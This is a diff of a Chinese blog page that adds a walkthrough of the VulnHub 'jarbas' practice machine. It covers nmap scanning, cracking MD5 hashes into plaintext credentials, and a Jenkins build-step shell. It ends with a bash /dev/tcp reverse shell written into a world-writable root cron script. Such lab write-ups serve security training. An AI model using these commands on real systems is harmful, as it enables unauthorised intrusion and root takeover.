@@ -6,20 +6,43 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="靶机地址 信息收集开始渗透权限提升">
+    <meta name="description" content="靶机地址jarbas 1.信息收集主机发现sudo nmap -sn 192.168.1.0&#x2F;24192.168.1.112是新出现的ip，确定为目标 端口扫描sudo nmap -p- --min-rate&#x3D;10000 $ip -oA nmapscan&#x2F;ports开放了22,80,3306,8080端口，看一下细节sudo nmap -sT -sC -sV -O $ip -p22,80,3306">
 <meta property="og:type" content="article">
 <meta property="og:title" content="靶场实战： jarbas">
 <meta property="og:url" content="https://ta3shi.github.io/2025/05/04/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9A%20jarbas/index.html">
 <meta property="og:site_name" content="ta3shi 个人学习自用">
-<meta property="og:description" content="靶机地址 信息收集开始渗透权限提升">
+<meta property="og:description" content="靶机地址jarbas 1.信息收集主机发现sudo nmap -sn 192.168.1.0&#x2F;24192.168.1.112是新出现的ip，确定为目标 端口扫描sudo nmap -p- --min-rate&#x3D;10000 $ip -oA nmapscan&#x2F;ports开放了22,80,3306,8080端口，看一下细节sudo nmap -sT -sC -sV -O $ip -p22,80,3306">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746716967995.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717176666.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717408936.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717539065.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717634653.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717817194.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717768949.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746718039911.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746718126850.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746718183883.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746718614909.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746719259286.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720076948.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720135341.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720355685.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720469830.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720600402.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720691549.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720741255.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720951602.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720987166.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746721048899.png">
 <meta property="article:published_time" content="2025-05-03T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-05-03T18:29:51.629Z">
+<meta property="article:modified_time" content="2025-05-08T16:18:45.611Z">
 <meta property="article:author" content="ta3shi">
 <meta property="article:tag" content="ctf-web">
 <meta property="article:tag" content="逻辑漏洞">
 <meta property="article:tag" content="漏洞修复">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746716967995.png">
     
     
       
@@ -119,7 +142,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">开始渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">权限提升</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">1.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.</span> <span class="toc-text">目录扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%BC%80%E5%A7%8B%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2.开始渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#md5%E7%A2%B0%E6%92%9E"><span class="toc-number">2.1.</span> <span class="toc-text">md5碰撞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jenkins-getshell"><span class="toc-number">2.2.</span> <span class="toc-text">jenkins getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">3.权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#suid-sudo%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">suid&#x2F;sudo提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">3.2.</span> <span class="toc-text">定时任务</span></a></li></ol></li></ol>
       </div>
     
   </span>
@@ -169,8 +192,25 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <p>靶机地址</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h2><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2>
+    <p>靶机地址<br><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/jarbas-1,232/">jarbas</a></p>
+<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p><code>sudo nmap -sn 192.168.1.0/24</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746716967995.png"><br>192.168.1.112是新出现的ip，确定为目标</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><code>sudo nmap -p- --min-rate=10000 $ip -oA nmapscan/ports</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717176666.png"><br>开放了22,80,3306,8080端口，看一下细节<code>sudo nmap -sT -sC -sV -O $ip -p22,80,3306,8080 -oA nmapscan/detail</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717408936.png"><br>80端口是php，8080端口可能存在robots.txt文件泄露<br>再看看默认的漏洞脚本扫描的结果<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717539065.png"><br>80端口可能有sql注入，8080端口有robots.txt的文件泄露，我们先看看。<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717634653.png"></p>
+<pre># we don't want robots to click "build" links</pre>我们不希望机器人点击build链接
+<p>80端口是jarbas<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717817194.png"><br>8080端口是一个jenkins的登录页面<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717768949.png"></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746718039911.png"><br>指定文件结尾时出现了一个access.html看看是什么<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746718126850.png"></p>
+<h2 id="2-开始渗透"><a href="#2-开始渗透" class="headerlink" title="2.开始渗透"></a>2.开始渗透</h2><h3 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h3><p>刚刚的东西猜测是用户名加密码，密码应该是MD5，用hash-identifier看看<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746718183883.png"><br>果然是md5，用一些碰撞软件解密一下，john和网站都可以尝试一下<br>在<a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">hash cracker</a>找到了，把john停下来<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746718614909.png"><br>现在的信息是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tiago: italia99</span><br><span class="line">trindade : vipsu</span><br><span class="line">eder : marianna</span><br></pre></td></tr></table></figure>
+<p>尝试登录8080的页面，最终使用eder&#x2F;vipsu登录成功<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746719259286.png"></p>
+<p>先了解一下jenkins这个cms：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Jenkins是一款开源的持续集成（CI）和持续交付（CD）工具，基于Java开发，广泛应用于自动化软件构建、测试、部署等流程。</span><br><span class="line">以下是其核心功能与特点的综合说明：</span><br><span class="line">核心功能持续集成与持续交付（CI/CD）Jenkins的核心作用是实现代码的持续集成与交付。当开发者提交代码到版本控制系统（如Git）时，Jenkins可自动触发构建流程，包括编译、测试、打包等步骤，并将结果反馈给开发者。若测试通过，还可进一步自动化部署到生产环境。</span><br><span class="line">自动化构建与测试支持通过Maven、Gradle等工具进行代码编译，并集成单元测试、代码质量检查（如SonarQube）等环节，确保每次代码变更后的质量。</span><br><span class="line">插件化扩展Jenkins拥有超过1000个插件，覆盖版本控制（Git/SVN）、构建工具、部署目标（如Docker、Kubernetes）、通知（邮件、钉钉）等功能，几乎能与所有主流的开发工具链集成。</span><br><span class="line">分布式构建支持主从架构（Master/Agent），可在多台服务器上并行执行任务，提升构建效率并降低单点负载压力。</span><br></pre></td></tr></table></figure>
+<h3 id="jenkins-getshell"><a href="#jenkins-getshell" class="headerlink" title="jenkins getshell"></a>jenkins getshell</h3><p>新建项目-&gt; 选择freestyle project -&gt; 下滑到build 选择执行shell（execute shell),尝试一下反弹shell<br>在<a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">生成反弹命令</a>生成一个shell的反弹命令<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720076948.png"><br>保存之后，本地起一个监听窗口<code>nc -lvvp 5555</code>然后点击网页的build now<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720135341.png"><br>成功拿到web用户权限</p>
+<h2 id="3-权限提升"><a href="#3-权限提升" class="headerlink" title="3.权限提升"></a>3.权限提升</h2><h3 id="suid-sudo提权"><a href="#suid-sudo提权" class="headerlink" title="suid&#x2F;sudo提权"></a>suid&#x2F;sudo提权</h3><p>尝试sudo提权，suid提权，应该都没有希望<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720355685.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720469830.png"><br>查看passwd文件，得到有远程登录的只有root用户和eder用户<br>尝试前面得到的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tiago: italia99</span><br><span class="line">trindade : vipsu</span><br><span class="line">eder : marianna</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720600402.png"><br>无果</p>
+<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>看看定时任务之类的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab #较为常用 </span><br><span class="line">cat /etc/cron.d #比较少用</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720691549.png"><br>root用户每五分钟会执行这个文件&#x2F;etc&#x2F;script&#x2F;CleaningScript.sh，看看权限<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720741255.png"><br>所有用户可读可写可执行，这不就是让我们写shell嘛，直接反弹命令安排上<br><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.114/6666 0&gt;&amp;1&quot; &gt; /etc/script/CleaningScript.sh</code><br>查看一下对不对<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720951602.png"><br>可以，起一个监听服务<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720987166.png"><br>成功拿到root权限，看看有没有flag啥的<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746721048899.png"><br>结束</p>
+
   </div>
 </article>
 
@@ -199,7 +239,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">开始渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">权限提升</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">1.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.</span> <span class="toc-text">目录扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%BC%80%E5%A7%8B%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2.开始渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#md5%E7%A2%B0%E6%92%9E"><span class="toc-number">2.1.</span> <span class="toc-text">md5碰撞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jenkins-getshell"><span class="toc-number">2.2.</span> <span class="toc-text">jenkins getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">3.权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#suid-sudo%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">suid&#x2F;sudo提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">3.2.</span> <span class="toc-text">定时任务</span></a></li></ol></li></ol>
       </div>
     
 
